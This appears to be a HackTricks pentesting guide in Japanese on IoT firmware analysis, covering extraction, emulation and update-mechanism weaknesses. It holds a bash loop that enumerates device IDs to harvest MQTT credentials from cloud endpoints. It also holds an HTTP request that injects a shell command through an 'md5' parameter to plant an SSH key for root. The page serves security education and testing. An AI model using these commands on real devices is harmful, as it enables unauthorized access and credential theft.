# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

## **導入**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが触れるソフトウェア間の通信を管理・仲介することでデバイスを正しく動作させるための重要なソフトウェアです。電源投入時点からアクセス可能な永続メモリに格納されており、OSの起動に至るための重要な命令を提供します。ファームウェアを解析し、場合によっては改変することは、セキュリティ脆弱性を特定する上で重要なステップです。

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を理解するための重要な初期ステップです。このプロセスでは以下のデータを収集します：

- CPUアーキテクチャや実行しているOS
- Bootloaderの詳細
- ハードウェアのレイアウトやデータシート
- コードベースのメトリクスとソースの所在
- 外部ライブラリとライセンス種類
- 更新履歴と規制認証
- アーキテクチャやフロー図
- セキュリティ評価と既知の脆弱性

この目的のために、オープンソースインテリジェンス (OSINT) ツールは非常に有用であり、入手可能なオープンソースソフトウェアコンポーネントの手動・自動のレビューも重要です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) のようなツールは、潜在的な問題を見つけるために利用できる無料の静的解析を提供します。

## **ファームウェアの取得**

ファームウェアの入手には複数の手段があり、それぞれ複雑さのレベルが異なります：

- 開発者やメーカーから**直接**入手する
- 提供された手順から**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているファームウェアファイルを見つけるために**Google dork** クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) のようなツールで**cloud storage** に直接アクセスする
- **updates** を man-in-the-middle によって傍受する
- デバイスから **UART**, **JTAG**, または **PICit** のような接続を介して**抽出**する
- デバイス通信内での更新リクエストを**スニッフィング**する
- **ハードコードされた更新エンドポイント** を特定して利用する
- ブートローダーやネットワークから**ダンプ**する
- それでも駄目な場合はストレージチップを**取り外して読み取る**（適切なハードウェアツールを使用）

## ファームウェアの解析

ファームウェアを入手したら、どのように扱うべきかを判断するために情報を抽出する必要があります。これに使えるさまざまなツール：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
もしそれらのツールであまり見つからない場合は、イメージの**entropy**を`binwalk -E <bin>`で確認してください。エントロピーが低ければ暗号化されている可能性は低く、エントロピーが高ければ暗号化されている（または何らかの方法で圧縮されている）可能性が高いです。

さらに、これらのツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/)（[code](https://code.google.com/archive/p/binvis/)）でファイルを確認してください。

### ファイルシステムの取得

`binwalk -ev <bin>` のような前述のツールで、**ファイルシステムを抽出**できているはずです。\
Binwalkは通常、それを**ファイルシステムの種類を名前にしたフォルダ**の中に抽出します。通常は次のいずれかです: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手動でのファイルシステム抽出

場合によっては、binwalkのシグネチャにファイルシステムの**マジックバイトが含まれていない**ことがあります。このような場合は、binwalkを使ってファイルシステムの**オフセットを見つけてバイナリから圧縮されたファイルシステムを切り出し（carve）**、下記の手順に従ってファイルシステムを**手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
以下の **dd command** を実行して Squashfs ファイルシステムを carving してください。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
あるいは、次のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上の例で使用）

`$ unsquashfs dir.squashfs`

ファイルはその後、`squashfs-root` ディレクトリに配置されます。

- CPIO アーカイブファイルの場合

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND フラッシュを使った ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの解析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために解析することが重要です。このプロセスでは、ファームウェアイメージから有用なデータを解析・抽出するために様々なツールを使用します。

### 初期解析ツール

バイナリファイル（`<bin>` と表記）を初期調査するためのコマンド群を示します。これらのコマンドは、ファイルタイプの特定、文字列抽出、バイナリデータの解析、パーティションやファイルシステムの詳細把握に役立ちます：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するために、**エントロピー** は `binwalk -E <bin>` で確認します。低いエントロピーは暗号化がないことを示唆し、高いエントロピーは暗号化または圧縮の可能性を示します。

**埋め込みファイル** を抽出するには、**file-data-carving-recovery-tools** ドキュメントやファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使用すると、通常ファイルシステムを抽出でき、しばしばファイルシステムタイプ名（例: squashfs, ubifs）のディレクトリに展開されます。しかし、マジックバイトが欠如しているために **binwalk** がファイルシステムタイプを認識できない場合は、手動での抽出が必要になります。これはまず `binwalk` でファイルシステムのオフセットを特定し、その後 `dd` コマンドでファイルシステムを切り出すことを意味します:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムのタイプ（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドが使用されます。

### ファイルシステム解析

ファイルシステムを抽出したら、セキュリティ上の欠陥の探索を開始します。不安全なネットワークデーモン、ハードコードされた資格情報、APIエンドポイント、アップデートサーバの機能、未コンパイルのコード、起動スクリプト、およびオフライン解析用のコンパイル済みバイナリに注目します。

**重要な場所** と **項目**（検査対象）には以下が含まれます:

- **etc/shadow** と **etc/passwd**（ユーザー認証情報）
- SSL証明書と鍵（**etc/ssl**）
- 潜在的な脆弱性を含む設定ファイルやスクリプト
- 追加解析のための組み込みバイナリ
- 一般的なIoTデバイスのウェブサーバやバイナリ

以下のツールは、ファイルシステム内の機密情報や脆弱性の発見を支援します:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) および [**Firmwalker**](https://github.com/craigz28/firmwalker) は機密情報の検索に有用です
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) は包括的なファームウェア解析向け
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、および [**EMBA**](https://github.com/e-m-b-a/emba) は静的／動的解析に有用です

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかるソースコードとコンパイル済みバイナリの両方を精査する必要があります。Unixバイナリ向けの **checksec.sh** や Windowsバイナリ向けの **PESecurity** のようなツールは、悪用され得る保護のないバイナリを識別するのに役立ちます。

## Harvesting cloud config and MQTT credentials via derived URL tokens

多くのIoTハブは、デバイスごとの設定を以下のようなクラウドエンドポイントから取得します:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

ファームウェア解析中に、<token> がデバイスIDをハードコードされたシークレットでローカルに導出していることが判明する場合があります。例えば:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計により、deviceId と STATIC_KEY を知る者は誰でもURLを再構築してクラウド設定を取得でき、しばしばプレーンテキストの MQTT 資格情報やトピック接頭辞が露出します。

Practical workflow:

1) UARTのブートログからdeviceIdを抽出する

- 3.3VのUARTアダプタ（TX/RX/GND）を接続し、ログを取得する:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- クラウド設定の URL パターンやブローカーアドレスを出力している行を探す。例えば:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) ファームウェアから STATIC_KEY と token アルゴリズムを復元する

- バイナリを Ghidra/radare2 に読み込み、config パス ("/pf/") や MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash で token を導出し、digest を大文字化する:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials を収集する

- URL を組み立て、curl で JSON を取得し、jq で解析して secrets を抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文の MQTT と弱いトピック ACL を悪用する（存在する場合）

- 取得した認証情報を使用してメンテナンス用トピックを購読し、機密性の高いイベントを探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (at scale, with authorization)

- 多くのエコシステムでは、ベンダーのOUI／製品／タイプを示すバイト列が埋め込まれ、その後に連番のサフィックスが続きます。
- 候補IDを反復し、トークンを導出し、プログラムで設定を取得できます：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- 大量の列挙を試みる前に、必ず明示的な許可を取得してください。
- 可能な場合は、ターゲットハードウェアを変更せずに秘密を回収するために、emulation や static analysis を優先してください。


ファームウェアをエミュレートするプロセスは、デバイスの動作全体または個々のプログラムの**dynamic analysis**を可能にします。このアプローチはハードウェアやアーキテクチャの依存性に起因する課題に直面することがありますが、ルートファイルシステムや特定のバイナリを、Raspberry Pi のようなアーキテクチャとエンディアンが一致するデバイス、または事前構築された仮想マシンに移すことで、さらなるテストが行いやすくなります。

### 個別バイナリのエミュレーション

単一のプログラムを調査する場合、プログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPS アーキテクチャの例

MIPSアーキテクチャのバイナリをエミュレートするには、次のコマンドを使用します:
```bash
file ./squashfs-root/bin/busybox
```
必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS（ビッグエンディアン）の場合は `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARMバイナリも同様の手順で、エミュレーションには `qemu-arm` を使用します。

### Full System Emulation

[ Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールは、フルシステムのファームウェアエミュレーションを容易にし、プロセスを自動化して動的解析を支援します。

## Dynamic Analysis in Practice

この段階では、実機またはエミュレートされたデバイス環境を用いて解析を行います。OS とファイルシステムへのシェルアクセスを維持することが重要です。エミュレーションはハードウェアの相互作用を完全には再現しない場合があり、そのためエミュレーションを再起動する必要が出てくることがあります。解析ではファイルシステムを再確認し、公開されているウェブページやネットワークサービスを調査・悪用し、ブートローダーの脆弱性も探るべきです。ファームウェアの整合性テストは、バックドアの可能性を特定するうえで重要です。

## Runtime Analysis Techniques

ランタイム解析は、プロセスやバイナリをその動作環境内で操作することを含みます。gdb-multiarch、Frida、Ghidra のようなツールを使ってブレークポイントを設定したり、fuzzing 等の手法で脆弱性を特定します。

## Binary Exploitation and Proof-of-Concept

特定した脆弱性の PoC を作成するには、ターゲットアーキテクチャの深い理解と低レベル言語でのプログラミングが必要です。組み込みシステムではバイナリのランタイム保護は稀ですが、存在する場合は Return Oriented Programming (ROP) のような手法が必要になることがあります。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような OS は、必要なツールを備えたファームウェアセキュリティテスト用の事前設定済み環境を提供します。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は IoT デバイスのセキュリティ評価とペネトレーションテストを支援するディストリビューションです。必要なツールが事前にロードされたプリコンフィグ済み環境を提供することで多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): EmbedOS は Ubuntu 18.04 ベースの組み込みセキュリティテスト用 OS で、ファームウェアセキュリティテスト用ツールがプリロードされています。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

ベンダーがファームウェアイメージに対して暗号署名の検証を実装していても、**バージョンロールバック（ダウングレード）保護が省略されることが多い**です。ブートローダーやリカバリローダーが埋め込まれた公開鍵で署名のみを検証し、フラッシュされるイメージの *version*（または単調増加するカウンタ）を比較しない場合、攻撃者は有効な署名を保持する **古い脆弱なファームウェア** を正規手段でインストールでき、修正された脆弱性を再導入できます。

Typical attack workflow:

1. **Obtain an older signed image**
* ベンダーの公開ダウンロードポータル、CDN、またはサポートサイトから入手する。
* コンパニオンのモバイル/デスクトップアプリケーションから抽出する（例: Android APK 内の `assets/firmware/`）。
* VirusTotal、インターネットアーカイブ、フォーラムなどのサードパーティリポジトリから取得する。
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI、mobile-app API、USB、TFTP、MQTT など。
* 多くのコンシューマ向け IoT デバイスは *unauthenticated* な HTTP(S) エンドポイントを公開しており、Base64 エンコードされたファームウェアブロブを受け取り、サーバー側でデコードしてリカバリ/アップグレードをトリガーします。
3. ダウングレード後、最新版で修正されている脆弱性を悪用する（例: 後から追加されたコマンドインジェクションフィルタを回避する）。
4. （オプション）永続化を得たら検知を避けるために最新版を再度フラッシュする、または更新を無効化する。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズされることなくシェルコマンドに直接連結され、任意のコマンドの injection を可能にします（ここでは – SSH key-based root access を有効化）。後のファームウェアバージョンでは基本的な文字フィルタが導入されましたが、ダウングレード保護が無いためその修正は無意味になります。

### モバイルアプリからのファームウェア抽出

多くのベンダーはコンパニオンモバイルアプリ内に完全なファームウェアイメージを同梱しており、アプリが Bluetooth/Wi-Fi 経由でデバイスを更新できるようにしています。これらのパッケージは通常、APK/APEX 内の `assets/fw/` や `res/raw/` といったパスに暗号化されずに格納されています。`apktool`、`ghidra`、あるいは単純な `unzip` といったツールを使えば、物理ハードウェアに触れることなく署名済みイメージを取り出すことができます。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 更新ロジック評価のチェックリスト

* *update endpoint* のトランスポート／認証は十分に保護されていますか（TLS + authentication）？
* デバイスはフラッシュする前に **version numbers** または **monotonic anti-rollback counter** を比較しますか？
* イメージは secure boot chain 内で検証されていますか（例: signatures が ROM code によってチェックされる）？
* userland code は追加の sanity checks を実行していますか（例: allowed partition map、model number）？
* *partial* または *backup* の update フローは同じ validation logic を再利用していますか？

> 💡  上記のいずれかが欠けている場合、プラットフォームはおそらく rollback attacks に対して脆弱です。

## 練習用の脆弱なファームウェア

ファームウェアの脆弱性を発見する練習には、以下の脆弱なファームウェアプロジェクトを出発点として使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## トレーニングと認定

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
